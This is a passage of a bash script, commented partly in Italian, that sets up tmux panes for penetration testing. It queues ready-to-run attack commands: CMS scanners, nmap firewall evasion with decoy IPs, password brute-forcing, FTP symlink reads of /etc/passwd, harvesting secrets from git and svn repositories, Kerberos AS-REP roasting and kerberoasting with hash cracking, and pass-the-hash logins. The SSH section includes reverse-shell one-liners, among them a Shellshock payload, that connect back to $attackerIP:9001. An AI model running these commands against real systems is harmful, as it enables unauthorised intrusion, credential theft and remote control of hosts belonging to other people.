tmux send-keys -t PT:22.0 "sudo python /opt/CMSmap/cmsmap.py $url –f J"
tmux send-keys -t PT:22.1 "# CMS: Joomla analysis with cmseek" Enter
tmux send-keys -t PT:22.1 "cmseek -u $url"
tmux send-keys -t PT:22.2 "# CMS: Joomla analysis with joomscan" Enter
tmux send-keys -t PT:22.2 "joomscan -u $url"
tmux send-keys -t PT:22.3 "# CMS: Joomla analysis with msfconsole" Enter
tmux send-keys -t PT:22.3 "msfconsole -q -x \"use auxiliary/scanner/http/joomla_plugins;set RHOSTS $ip;set THREADS 5;run\""
tmux send-keys -t PT:22.4 "# CMS: Joomla exploitation" Enter
tmux send-keys -t PT:22.4 "searchsploit <module>"
cd $folderProject

# CMS DRUPAL
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:23 -n 'CMS Drupal'
tmux split-window -v -t PT:23.0
tmux select-pane -t "23.0"
tmux split-window -h -t "23.0"
tmux split-window -h -t "23.0"
tmux split-window -v -t PT:23.3
tmux split-window -v -t PT:23.4
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:23.0 "# CMS: Drupal analysis with cmsmap" Enter
tmux send-keys -t PT:23.0 "sudo python /opt/CMSmap/cmsmap.py $url –f D"
tmux send-keys -t PT:23.1 "# CMS: Drupal analysis with cmseek" Enter
tmux send-keys -t PT:23.1 "cmseek -u $url"
tmux send-keys -t PT:23.2 "# CMS: Drupal analysis with firefox" Enter
tmux send-keys -t PT:23.2 "firefox https://hackertarget.com/drupal-security-scan/ &"
tmux send-keys -t PT:23.3 "# CMS: Drupal Version" Enter
tmux send-keys -t PT:23.3 "firefox $url/CHANGELOG.txt &"
tmux send-keys -t PT:23.4 "# CMS: Drupal exploitation" Enter
tmux send-keys -t PT:23.4 "searchsploit <module>"
cd $folderProject

# Attivazione della modalità interattiva
tmux -2 attach-session -t PT
;;










        4)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> Service Information Gathering
######################
######################
tmux new-session -d -s PT -n "any other business"
tmux send-keys "ip=$ip" Enter
tmux send-keys "site=$site" Enter
tmux send-keys "domain=$domain" Enter
tmux send-keys "cd $folderProjectInfoGathering" Enter


# SERVIVE INFORMATION GATHERING
cd $folderProjectServiceInfoGathering
# ServiceInformationGathering
# Layout
tmux new-window -t PT:1 -n 'Service Information Gathering'
tmux split-window -v -t PT:1.0
tmux select-pane -t "1.0"
tmux split-window -h -t "1.0"
tmux split-window -v -t PT:1.2
tmux split-window -v -t PT:1.3
tmux select-pane -t "1.3"
tmux split-window -h -t "1.3"
tmux split-window -v -t PT:1.5
tmux select-pane -t "1.5"
tmux split-window -h -t "1.5"
tmux split-window -h -t "1.5"
tmux split-window -h -t "1.5"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:1.0 "# Service Information Gathering - TCP" Enter
tmux send-keys -t PT:1.0 "sudo nmap -sV -sC -O -Pn --script firewall-bypass $ip -oA out"
tmux send-keys -t PT:1.1 "# Service Information Gathering - TCP (all)" Enter
tmux send-keys -t PT:1.1 "sudo nmap -sV -sC -O -Pn -p- --script firewall-bypass $ip -oA out"
tmux send-keys -t PT:1.2 "# Service Information Gathering - UDP" Enter
tmux send-keys -t PT:1.2 "sudo nmap -sU -F $ip -Pn"
tmux send-keys -t PT:1.3 "# Service Information Gathering - Scanning Vulnerability - get ports" Enter
tmux send-keys -t PT:1.3 "ports=\$(nmap -p- --max-retries 0 -T5 --script firewall-bypass -Pn $ip | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)"
tmux send-keys -t PT:1.4 "# Service Information Gathering - Scanning Vulnerability - get vulnerabilities" Enter
tmux send-keys -t PT:1.4 "sudo nmap -Pn --script vuln --script firewall-bypass $ip -oA out.SPEC -p $ports"
tmux send-keys -t PT:1.5 "# Service Information Gathering - through FW with SOURCE PORT 80" Enter
tmux send-keys -t PT:1.5 "sudo nmap -g 80 -sV -sC -O -Pn --script firewall-bypass $ip -oA out.80.txt"
tmux send-keys -t PT:1.6 "# Service Information Gathering - through FW with DECOY" Enter
tmux send-keys -t PT:1.6 "nmap -D 216.58.212.67,66.196.86.81,me,46.228.47.115,104.28.6.11,104.27.163.229,198.84.60.198,192.124.249.8 -sV -sC -O -Pn --script firewall-bypass $ip -oA out.decoy.txt"
tmux send-keys -t PT:1.7 "# Service Information Gathering - through FW with SYNFIN" Enter
tmux send-keys -t PT:1.7 "sudo nmap -sS --scanflags SYNFIN -sV -sC -O -Pn --script firewall-bypass $ip -oA out.synfin.txt"
tmux send-keys -t PT:1.8 "# Service Information Gathering - through FW with TIMING" Enter
tmux send-keys -t PT:1.8 "sudo nmap –T2 -sV -sC -O -Pn --script firewall-bypass $ip -oA out.timing.txt"
cd $folderProject

# Attivazione della modalità interattiva
tmux -2 attach-session -t PT
;;










        5)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> Vulnerability: duckduckgo, searchsploit, nessus, nikto, etc
######################
######################

# contiene:
# - le funzioni comuni
# - la richiesta dei parametri utente
# - la creazione delle cartelle di progetto
#source "common"
# Creazione di una sessione Tmux con attivazione VPN

tmux new-session -d -s PT -n "any other business"
tmux send-keys "ip=$ip" Enter
tmux send-keys "site=$site" Enter
tmux send-keys "domain=$domain" Enter
tmux send-keys "cd $folderProjectQuickWin" Enter


# duckduckgo, msfconsole
cd $folderProjectQuickWin
# Layout
tmux new-window -t PT:1 -n 'duckduckgo, searchSploit'
tmux split-window -v -t PT:1.0
tmux split-window -v -t PT:1.1
tmux split-window -v -t PT:1.2
tmux split-window -v -t PT:1.3
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:1.0 "# duckduckgo vulnerability scan" Enter
tmux send-keys -t PT:1.0 "xdg-open \"https://duckduckgo.com/?q=<servizio>+default+password\" & xdg-open \"https://duckduckgo.com/?q=<servizio>+default+credentials\" & xdg-open \"https://duckduckgo.com/?q=<servizio>+vulnerability+poc+github\" & xdg-open \"https://duckduckgo.com/?q=<servizio>+exploit+poc+github\""
tmux send-keys -t PT:1.1 "# searchsploit vulnerability scan" Enter
tmux send-keys -t PT:1.1 "searchsploit \"<servizio>\""
tmux send-keys -t PT:1.2 "# msfconsole vulnerability scan" Enter
tmux send-keys -t PT:1.2 "msfupdate; msfconsole -qx \"search type:exploit <servizio>\""
cd $folderProject


# WEB google dork
cd $folderProjectQuickWin
# Layout
tmux new-window -t PT:2 -n 'google dork'
tmux split-window -v -t PT:2.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:2.0 "domain=$domain" Enter
tmux send-keys -t PT:2.0 "ip=$ip" Enter
tmux send-keys -t PT:2.0 "site=$site" Enter
tmux send-keys -t PT:2.0 "# google dork" Enter
tmux send-keys -t PT:2.0 "grep -v '^#' $folderProjectEngine/google-dork.txt | sed 's/\$domain/\\$domain/g' | xargs -I {} xdg-open \"https://google.com/?q=\"{}"
cd $folderProject


# Nessus
cd $folderProjectQuickWin
# Layout
tmux new-window -t PT:3 -n 'Nessus'
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:3.0 "# nessus vulnerability scan" Enter
tmux send-keys -t PT:3.0 "sudo systemctl start nessusd && sleep 2 && xdg-open \"https://127.0.0.1:8834/\""
cd $folderProject


# Nikto
cd $folderProjectQuickWin
# Layout
tmux new-window -t PT:4 -n 'Nikto'
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:4.0 "# Nikto vulnerability scan" Enter
tmux send-keys -t PT:4.0 "sudo nikto -h $url"
cd $folderProject



# ZAP
cd $folderProjectQuickWin
# Layout
tmux new-window -t PT:5 -n 'ZAP'
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:5.0 "# ZAP vulnerability scan" Enter
tmux send-keys -t PT:5.0 "sudo /opt/zaproxy/zap.sh"
cd $folderProject


# Attivazione della modalità interattiva
tmux -2 attach-session -t PT
;;











        6)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> Service AuthN bypass: ssh, ftp, smtp,  etc
######################
######################
tmux new-session -d -s PT -n "any other business"
tmux send-keys "ip=$ip" Enter
tmux send-keys "site=$site" Enter
tmux send-keys "domain=$domain" Enter
tmux send-keys "cd $folderProjectInfoGathering" Enter

# Service AuthN bypass
cd $folderProjectAuthN
# ALL PROTOCOL !!!
tmux new-window -t PT:1 -n 'ALL PROTOCOLs activities'
tmux split-window -v -t PT:1.0
tmux select-pane -t "1.0"
tmux split-window -h -t "1.0"
tmux split-window -h -t "1.0"
tmux split-window -v -t PT:1.3
tmux select-pane -t "1.3"
tmux split-window -h -t "1.3"
tmux split-window -h -t "1.3"
tmux split-window -h -t "1.3"
tmux split-window -v -t PT:1.7
tmux select-pane -t "1.7"
tmux split-window -h -t "1.7"
tmux split-window -h -t "1.7"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:1.0 "# Bruteforce find DICTIONARY with seclists" Enter
tmux send-keys -t PT:1.0 "find /usr/share/seclists/ -follow | grep user | xargs wc -l | sort -n"
tmux send-keys -t PT:1.1 "# Bruteforce find DICTIONARY with seclists" Enter
tmux send-keys -t PT:1.1 "find /usr/share/seclists/ -follow | grep pass | xargs wc -l | sort -n"
tmux send-keys -t PT:1.2 "# Create DICTIONARY with cewl" Enter
tmux send-keys -t PT:1.2 "cewl $url -d 3 -m 5 -w cewl-subdomain.txt --with-numbers"
tmux send-keys -t PT:1.3 "# Bruteforce with HYDRA" Enter
tmux send-keys -t PT:1.3 "hydra -L users.txt -P passwords.txt [-t 32] $ip ftp"
tmux send-keys -t PT:1.4 "# Bruteforce with NCRACK" Enter
tmux send-keys -t PT:1.4 "ncrack -p 21 -U users.txt -P passwords.txt $ip [-T 5]"
tmux send-keys -t PT:1.5 "# Bruteforce with MEDUSA" Enter
tmux send-keys -t PT:1.5 "medusa -U users.txt -P passwords.txt -h $ip -M ftp"
tmux send-keys -t PT:1.6 "# Bruteforce with CRACKMAPEXEC" Enter
tmux send-keys -t PT:1.6 "crackmapexec ssh $ip -u users.txt -p pass.txt "
tmux send-keys -t PT:1.7 "# Exploitation: update searchsploit" Enter
tmux send-keys -t PT:1.7 "searchsploit -u"
tmux send-keys -t PT:1.8 "# Exploitation: search" Enter
tmux send-keys -t PT:1.8 "searchsploit \"<service to attack>\""
tmux send-keys -t PT:1.9 "# Exploitation with msfconsole" Enter
tmux send-keys -t PT:1.9 "msfconsole -qx \"search type:exploit <servizio da cercare>\""
cd $folderProject


# Service AuthN bypass
cd $folderProjectAuthN
# FTP
tmux new-window -t PT:2 -n '[21] FTP'
tmux split-window -v -t PT:2.0
tmux split-window -v -t PT:2.1
tmux select-pane -t "2.1"
tmux split-window -h -t "2.1"
tmux split-window -h -t "2.1"
tmux split-window -h -t "2.1"
tmux split-window -h -t "2.1"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:2.0 "# FTP service fingerprint" Enter
tmux send-keys -t PT:2.0 "nmap -sV -Pn -vv -p 21 --script=ftp* $ip -oA out.21"
tmux send-keys -t PT:2.1 "# FTP Information Exposure: get all data PASSIVE mode" Enter
tmux send-keys -t PT:2.1 "wget -m ftp://anonymous:anonymous@$ip"
tmux send-keys -t PT:2.2 "# FTP Information Exposure: gat all data ACTIVe mode " Enter
tmux send-keys -t PT:2.2 "wget -m –no-passive ftp://anonymous:anonymous@$ip"
tmux send-keys -t PT:2.3 "# FTP Information Exposure: get all data specifying user and pass" Enter
tmux send-keys -t PT:2.3 "wget -r --user=\"user\" --password=\"Pass\" ftp://$ip"
tmux send-keys -t PT:2.4 "# FTP Information Exposure; Symlink attack with site exec" Enter
tmux send-keys -t PT:2.4 "(echo \"user anonymous anonymous\"; echo \"help\"; echo \"site exec ln -s /etc/passwd passwd_ln\"; echo \"site exec passwd_ln\"; echo \"bye\") | ftp -n $ip"
tmux send-keys -t PT:2.5 "# FTP Information Exposure; Symlink attack with site symlink " Enter
tmux send-keys -t PT:2.5 "(echo \"user anonymous anonymous\"; echo \"help\"; echo \"site symlink /etc/passwd passwd_ln\"; echo \"site exec passwd_ln\"; echo \"bye\") | ftp -n $ip"
cd $folderProject

cd $folderProjectAuthN
# GIT
tmux new-window -t PT:3 -n '[22,80,445] GIT'
tmux split-window -v -t PT:3.0
tmux select-pane -t "3.0"
tmux split-window -h -t "3.0"
tmux split-window -h -t "3.0"
tmux split-window -h -t "3.0"
tmux split-window -h -t "3.0"
tmux split-window -h -t "3.0"
tmux split-window -v -t PT:3.6
tmux select-pane -t "3.6"
tmux split-window -h -t "3.6"
tmux split-window -h -t "3.6"
tmux split-window -v -t PT:3.9
tmux select-pane -t "3.9"
tmux split-window -h -t "3.9"
tmux split-window -h -t "3.9"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:3.0 "# GIT download LOCAL repository" Enter
tmux send-keys -t PT:3.0 "git clone /opt/git/project.git"
tmux send-keys -t PT:3.1 "# GIT download LOCAL repository" Enter
tmux send-keys -t PT:3.1 "git clone file:///opt/git/project.git"
tmux send-keys -t PT:3.2 "# GIT download REMOTE repository" Enter
tmux send-keys -t PT:3.2 "git clone $url/project.git"
tmux send-keys -t PT:3.3 "# GIT download REMOTE repository" Enter
tmux send-keys -t PT:3.3 "git clone ssh://user@$domain/project.git"
tmux send-keys -t PT:3.4 "# GIT download .git file" Enter
tmux send-keys -t PT:3.4 "source git_stuff/bin/activate && git-dumper $url/.git/ ./"
tmux send-keys -t PT:3.5 "# GIT download .git file" Enter
tmux send-keys -t PT:3.5 "wget --recursive --no-clobber --page-requisites --convert-links --domains targetDomain.ctf --no-parent $url/.git/"
tmux send-keys -t PT:3.6 "# GIT repository analysis (user, pass, token) with gitleaks" Enter
tmux send-keys -t PT:3.6 "sudo gitleaks detect --source=/path/to/.git --verbose"
tmux send-keys -t PT:3.7 "# GIT repository analysis (user, pass, token) with trufflwhog" Enter
tmux send-keys -t PT:3.7 "trufflehog git /path/to/.git"
tmux send-keys -t PT:3.8 "# GIT repository analysis (user, pass, token) with grep" Enter
tmux send-keys -t PT:3.8 "grep -r \"password\|secret\|token\|key\" /home/kali/Desktop/appo/SiteSniper/"
tmux send-keys -t PT:3.9 "# GIT: navigate the repository versioning" Enter
tmux send-keys -t PT:3.9 "git log -p"
tmux send-keys -t PT:3.10 "# GIT: navigate the repository versioning" Enter
tmux send-keys -t PT:3.10 "git diff <UUID commit>"
tmux send-keys -t PT:3.11 "# GIT: navigate the repository versioning" Enter
tmux send-keys -t PT:3.11 "git reset --hard <UUID commit>"
cd $folderProject

cd $folderProjectAuthN
# SSH
tmux new-window -t PT:4 -n '[22] SSH'
tmux split-window -v -t PT:4.0
tmux split-window -v -t PT:4.1
tmux select-pane -t "4.1"
tmux split-window -h -t "4.1"
tmux split-window -v -t PT:4.3
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:4.0 "# SSH Service fingerprint" Enter
tmux send-keys -t PT:4.0 "nmap -sV -Pn -vv -p 22 --script=ftp* $ip -oA out.22"
tmux send-keys -t PT:4.1 "# SSH blocked bypass calling attackerIP:9001" Enter
tmux send-keys -t PT:4.1 "ssh <USER>@$ip 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $attackerIP 9001 >/tmp/f'"
tmux send-keys -t PT:4.2 "# SSH blocked bypass calling attackerIP:9001" Enter
tmux send-keys -t PT:4.2 "ssh <USER>@$ip '() { :;}; /bin/nc -nv $attackerIP 9001 -e /bin/bash'"
tmux send-keys -t PT:4.3 "# SSH Hijacking" Enter
tmux send-keys -t PT:4.3 "SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.XXXX ssh root@<TARGET_IP> -p <TARGET_PORT>"
cd $folderProject

cd $folderProjectAuthN
# SVN
tmux new-window -t PT:5 -n '[22,80,443,3690] SVN'
tmux split-window -v -t PT:5.0
tmux select-pane -t "5.0"
tmux split-window -h -t "5.0"
tmux split-window -h -t "5.0"
tmux split-window -v -t PT:5.3
tmux select-pane -t "5.3"
tmux split-window -h -t "5.3"
tmux split-window -h -t "5.3"
tmux split-window -v -t PT:5.6
tmux select-pane -t "5.6"
tmux split-window -h -t "5.6"
tmux split-window -h -t "5.6"
tmux split-window -v -t PT:5.9
tmux select-pane -t "5.9"
tmux split-window -h -t "5.9"
tmux split-window -h -t "5.9"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:5.0 "# SVN: download SVN repository" Enter
tmux send-keys -t PT:5.0 "svn checkout $url/url-del-repo-svn /path/to/local/folder"
tmux send-keys -t PT:5.1 "# SVN: download SVN repository" Enter
tmux send-keys -t PT:5.1 "svn checkout file:///$site/percorso/del/repo/svn /path/to/local/folder"
tmux send-keys -t PT:5.2 "# SVN: analyze SVN repo with grep" Enter
tmux send-keys -t PT:5.2 "grep -r \"password\|token\|api_key\" /path/to/local/folder"
tmux send-keys -t PT:5.3 "# SVN: download SVN repository as GIT one" Enter
tmux send-keys -t PT:5.3 "git svn clone $url/url-del-repo-svn"
tmux send-keys -t PT:5.4 "# SVN: download SVN repository as GIT one" Enter
tmux send-keys -t PT:5.4 "git svn clone --stdlayout --prefix=svn/ --no-metadata $url/url-del-repo-svn"
tmux send-keys -t PT:5.5 "# SVN: download SVN repository as GIT one" Enter
tmux send-keys -t PT:5.5 "git svn clone --trunk=nome_trunk --branches=nome_branches --tags=nome_tags https://url-del-repo-svn"
tmux send-keys -t PT:5.6 "# SVN repository (downloaded as GIT repo) analysis (user, pass, token) with gitleaks" Enter
tmux send-keys -t PT:5.6 "sudo gitleaks detect --source=/path/to/.git --verbose"
tmux send-keys -t PT:5.7 "# SVN repository (downloaded as GIT repo) analysis (user, pass, token) with trufflwhog" Enter
tmux send-keys -t PT:5.7 "trufflehog git /path/to/.git"
tmux send-keys -t PT:5.8 "# SVN repository (downloaded as GIT repo) analysis (user, pass, token) with grep" Enter
tmux send-keys -t PT:5.8 "grep -r \"password\|secret\|token\|key\" /home/kali/Desktop/appo/SiteSniper/"
tmux send-keys -t PT:5.9 "# SVN: navigate the SVN repository (downloaded as GIT repo) versioning" Enter
tmux send-keys -t PT:5.9 "git log -p"
tmux send-keys -t PT:5.10 "# SVN: navigate the SVN repository (downloaded as GIT repo) versioning" Enter
tmux send-keys -t PT:5.10 "git diff <UUID commit>"
tmux send-keys -t PT:5.11 "# SVN: navigate the SVN repository (downloaded as GIT repo) versioning" Enter
tmux send-keys -t PT:5.11 "git reset --hard <UUID commit>"
cd $folderProject

cd $folderProjectAuthN
# Telnet
tmux new-window -t PT:6 -n '[23] Telnet'
tmux split-window -v -t PT:6.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:6.0 "# Telnet: Service fingerprint" Enter
tmux send-keys -t PT:6.0 "nmap -sV -Pn -vv -p 23 --script=telnet* $ip -oA out.23"
cd $folderProject

cd $folderProjectAuthN
# SMTP
tmux new-window -t PT:7 -n '[25] SMTP'
tmux split-window -v -t PT:7.0
tmux split-window -v -t PT:7.1
tmux select-pane -t "7.1"
tmux split-window -h -t "7.1"
tmux split-window -h -t "7.1"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:7.0 "# SMTP: Service fingerprint" Enter
tmux send-keys -t PT:7.0 "nmap -sV -Pn -vv -p 25 --script=smtp-* $ip -oA out.25"
tmux send-keys -t PT:7.1 "# SMTP: Email enumeration with ismtp" Enter
tmux send-keys -t PT:7.1 "ismtp -h $ip:25 -e ./users.txt"
tmux send-keys -t PT:7.2 "# SMTP: Email enumeration with smtp-user-enum" Enter
tmux send-keys -t PT:7.2 "smtp-user-enum -M VRFY -D $domain -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t $ip | cut -d " " -f2 | tee smtp.user.txt"
tmux send-keys -t PT:7.3 "# SMTP: Email enumeration manually (with telnet + VRFY email)" Enter
tmux send-keys -t PT:7.3 "telnet $ip 25"
cd $folderProject

cd $folderProjectAuthN
# DNS
tmux new-window -t PT:8 -n '[53] DNS'
tmux split-window -v -t PT:8.0
tmux split-window -v -t PT:8.1
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:8.0 "# DNS: Service fingerprint" Enter
tmux send-keys -t PT:8.0 "nmap -sV -Pn -vv -p 53 --script=smtp-* $ip -oA out.53"
tmux send-keys -t PT:8.1 "# DNS: Information Gathering" Enter
tmux send-keys -t PT:8.1 "##############################################################" Enter
tmux send-keys -t PT:8.1 "## PLEASE REFER TO OSINT > OSINT: Data Exfiltration Section ##" Enter
tmux send-keys -t PT:8.1 "##############################################################" Enter
tmux send-keys -t PT:8.1 ""
cd $folderProject

cd $folderProjectAuthN
# TFTP
tmux new-window -t PT:9 -n '[69] TFTP'
tmux split-window -v -t PT:9.0
tmux split-window -v -t PT:9.1
tmux split-window -v -t PT:9.2
tmux split-window -v -t PT:9.3
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:9.0 "# TFTP: Service fingerprint" Enter
tmux send-keys -t PT:9.0 "nmap -sV -Pn -vv -p 69 --script=smtp-* $ip -oA out.69"
tmux send-keys -t PT:9.1 "# TFTP: File enumeration" Enter
tmux send-keys -t PT:9.1 "nmap  -sU -p69 --script tftp-enum --script-args tftp-enum.filelist=customlist.txt $ip -Pn"
tmux send-keys -t PT:9.2 "# TFTP: bruteforce" Enter
tmux send-keys -t PT:9.2 "msfconsole -q -x \"use auxiliary/scanner/tftp/tftpbrute; set RHOSTS $ip; set DICTIONARY /usr/share/metasploit-framework/data/wordlists/tftp.txt; run\""
tmux send-keys -t PT:9.3 "# TFTP: bruteforce" Enter
tmux send-keys -t PT:9.3 "###############################################################" Enter
tmux send-keys -t PT:9.3 "## ALSO PLEASE REFER TO SERVICE AUTHN BYPASS > ALL PROTOCOLs ##" Enter
tmux send-keys -t PT:9.3 "###############################################################" Enter
tmux send-keys -t PT:9.3 ""
cd $folderProject

cd $folderProjectAuthN
# finger
tmux new-window -t PT:10 -n '[79] Finger'
tmux split-window -v -t PT:10.0
tmux split-window -v -t PT:10.1
tmux select-pane -t "10.1"
tmux split-window -h -t "10.1"
tmux split-window -h -t "10.1"
tmux split-window -v -t PT:10.4
tmux select-pane -t "10.4"
tmux split-window -h -t "10.4"
tmux split-window -h -t "10.4"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:10.0 "# Finger: Service fingerprint" Enter
tmux send-keys -t PT:10.0 "nmap -sV -Pn -vv -p 79 --script=finger* $ip -oA out.79"
tmux send-keys -t PT:10.1 "# Finger: Enumerate Connected Users with finger" Enter
tmux send-keys -t PT:10.1 "finger @$ip"
tmux send-keys -t PT:10.2 "# Finger: Get extended info for a specific User with finger" Enter
tmux send-keys -t PT:10.2 "finger -l utente@$ip"
tmux send-keys -t PT:10.3 "# Finger: Get restricted info for a specific User with finger" Enter
tmux send-keys -t PT:10.3 "finger -s utente@$ip"
tmux send-keys -t PT:10.4 "# Find a user's dictionary to enumerate target user with finger-user-enum" Enter
tmux send-keys -t PT:10.4 "find /usr/share/seclists/ -follow | grep user | xargs wc -l | sort -n"
tmux send-keys -t PT:10.5 "# Finger: Enumerate target users with finger-user-enum" Enter
tmux send-keys -t PT:10.5 "/opt/finger-user-enum/finger-user-enum/finger-user-enum.pl -U usernames.txt -t $ip | tee finger.user.txt"
tmux send-keys -t PT:10.6 "# Finger: Enumerate target users with msfconsole" Enter
tmux send-keys -t PT:10.6 "msfconsole -q -x \"use auxiliary/scanner/finger/finger_users; set RHOSTS $ip; run\""
cd $folderProject

cd $folderProjectAuthN
# Kerberos - Enumeration
tmux new-window -t PT:11 -n '[88] Kerberos - Enumeration'
tmux split-window -v -t PT:11.0
tmux select-pane -t "11.0"
tmux split-window -h -t "11.0"
tmux split-window -v -t PT:11.2
tmux select-pane -t "11.2"
tmux split-window -h -t "11.2"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:11.0 "# Kerberos-Enumeration: create a username dictionary with usrname-anarchy" Enter
tmux send-keys -t PT:11.0 "sudo /opt/username-anarchy/username-anarchy mario rossi"
tmux send-keys -t PT:11.1 "# Kerberos-Enumeration: create a username dictionary with webSite" Enter
tmux send-keys -t PT:11.1 "grep -v '^#' $folderProjectEngine/kerberos-enumeration.txt | xargs -I {} xdg-open {}"
tmux send-keys -t PT:11.2 "# Kerberos-Enumeration: Verify valid username with nmap" Enter
tmux send-keys -t PT:11.2 "nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="$domain",userdb=users.txt $ip"
tmux send-keys -t PT:11.3 "# Kerberos-Enumeration: Verify valid username with kerbrute" Enter
tmux send-keys -t PT:11.3 "/home/kali/.local/bin/kerbrute -users users.txt -dc-ip $ip -domain $domain "
cd $folderProject

cd $folderProjectAuthN
# Kerberos - ASREP-roasting
tmux new-window -t PT:12 -n '[88] Kerberos - ASREP-roasting'
tmux split-window -v -t PT:12.0
tmux select-pane -t "12.0"
tmux split-window -h -t "12.0"
tmux split-window -h -t "12.0"
tmux split-window -h -t "12.0"
tmux split-window -h -t "12.0"
tmux split-window -v -t PT:12.5
tmux select-pane -t "12.5"
tmux split-window -h -t "12.5"
tmux split-window -v -t PT:12.7
tmux select-pane -t "12.7"
tmux split-window -h -t "12.7"
tmux split-window -h -t "12.7"
tmux split-window -h -t "12.7"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:12.0 "# Kerberos-ASREP-roasting: Enumerate SPNs and HASH-NT with GENERIC REQUEST and a single file with MORE USERNAME" Enter
tmux send-keys -t PT:12.0 "netexec ldap $ip -u users.txt -p '' --asreproast"
tmux send-keys -t PT:12.1 "# Kerberos-ASREP-roasting: Enumerate SPNs and HASH-NT with GENERIC REQUEST and a single file with MORE USERNAME" Enter
tmux send-keys -t PT:12.1 "/usr/share/doc/python3-impacket/examples/GetNPUsers.py $domain/ -dc-ip $ip -no-pass -usersfile user.txt -outputfile asrep.txt -format john"
tmux send-keys -t PT:12.2 "# Kerberos-ASREP-roasting: Enumerate SPNs and HASH-NT with TGT REQUEST and a single file with MORE USERNAME" Enter
tmux send-keys -t PT:12.2 "/usr/share/doc/python3-impacket/examples/GetNPUsers.py $domain/user1 -dc-ip $ip -no-pass -outputfile asrep.txt -format john"
tmux send-keys -t PT:12.3 "# Kerberos-ASREP-roasting: Enumerate SPNs and HASH-NT with GENERIC REQUEST and a single file with SINGLE USERNAME" Enter
tmux send-keys -t PT:12.3 "/usr/share/doc/python3-impacket/examples/GetNPUsers.py $domain/user1 -dc-ip $ip -no-pass -outputfile asrep.txt -format john"
tmux send-keys -t PT:12.4 "# Kerberos-ASREP-roasting: Enumerate SPNs and HASH-NT with TGT REQUEST and a single file with SINGLE USERNAME" Enter
tmux send-keys -t PT:12.4 "/usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip $ip -request 'sequel.htb/user1' -format hashcat -outputfile ~/my.hash"
tmux send-keys -t PT:12.5 "# Kerberos-ASREP-roasting: Crack token TGT with John The Ripper" Enter
tmux send-keys -t PT:12.5 "john asrep.txt --wordlist=/path/to/wordlist"
tmux send-keys -t PT:12.6 "# Kerberos-ASREP-roasting: Crack token TGT with hashcat" Enter
tmux send-keys -t PT:12.6 "hashcat -m 18200 -d 3 -a 0 my.hash rockyou.txt"
tmux send-keys -t PT:12.7 "# Kerberos-ASREP-roasting: Access remote target with USERNAME-PASS" Enter
tmux send-keys -t PT:12.7 "evil-winrm -i $ip -u <utente> -p <password>"
tmux send-keys -t PT:12.8 "# Kerberos-ASREP-roasting: Access remote target with USERNAME-PASS" Enter
tmux send-keys -t PT:12.8 "crackmapexec smb $ip -u <utente> -p <password> -x \"<comando>\""
tmux send-keys -t PT:12.9 "# Kerberos-ASREP-roasting: Access remote target with PTT" Enter
tmux send-keys -t PT:12.9 "evil-winrm -i $ip -u <utente> -H <hash_NT>"
tmux send-keys -t PT:12.10 "# Kerberos-ASREP-roasting: Access remote target with PTT" Enter
tmux send-keys -t PT:12.10 "crackmapexec smb $ip -u <utente> -H <HASH-NT> -x \"<comando>\""
cd $folderProject

cd $folderProjectAuthN
# Kerberos - KERBEROASTING
tmux new-window -t PT:13 -n '[88] Kerberos - KERBEROASTING'
tmux split-window -v -t PT:13.0
tmux select-pane -t "13.0"
tmux split-window -h -t "13.0"
tmux split-window -h -t "13.0"
tmux split-window -h -t "13.0"
tmux split-window -h -t "13.0"
tmux split-window -h -t "13.0"
tmux split-window -h -t "13.0"
tmux split-window -v -t "13.0"
tmux split-window -v -t PT:13.7
tmux select-pane -t "13.7"
tmux split-window -h -t "13.7"
tmux split-window -v -t PT:13.9
tmux select-pane -t "13.9"
tmux split-window -h -t "13.9"
tmux split-window -h -t "13.9"
tmux split-window -h -t "13.9"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:13.0 "# Kerberos KERBEROASTING: Enumerate SPNs and HASH-NT with credentials"  Enter
tmux send-keys -t PT:13.0 "netexec ldap $ip -u '<USER>' -p '<PASS>' –kerberosting"
tmux send-keys -t PT:13.1 "# Kerberos KERBEROASTING: Enumerate SPNs and HASH-NT with credentials" Enter
tmux send-keys -t PT:13.1 "python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $ip '$domain/<USER>:<PASS>'"
tmux send-keys -t PT:13.2 "# Kerberos KERBEROASTING: Enumerate SPNs and HASH-NT with credentials" Enter
tmux send-keys -t PT:13.2 "crackmapexec ldap $ip -u <USER> -p '<PASS>' --kerberoasting kerberoastables.txt --kdcHost $ip"
tmux send-keys -t PT:13.3 "# Kerberos KERBEROASTING: Enumerate SPNs and HASH-NT with ASREP-roasting users" Enter
tmux send-keys -t PT:13.3 "python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -no-preauth -usersfile utenti.txt -dc-host $ip $domain/ -request"
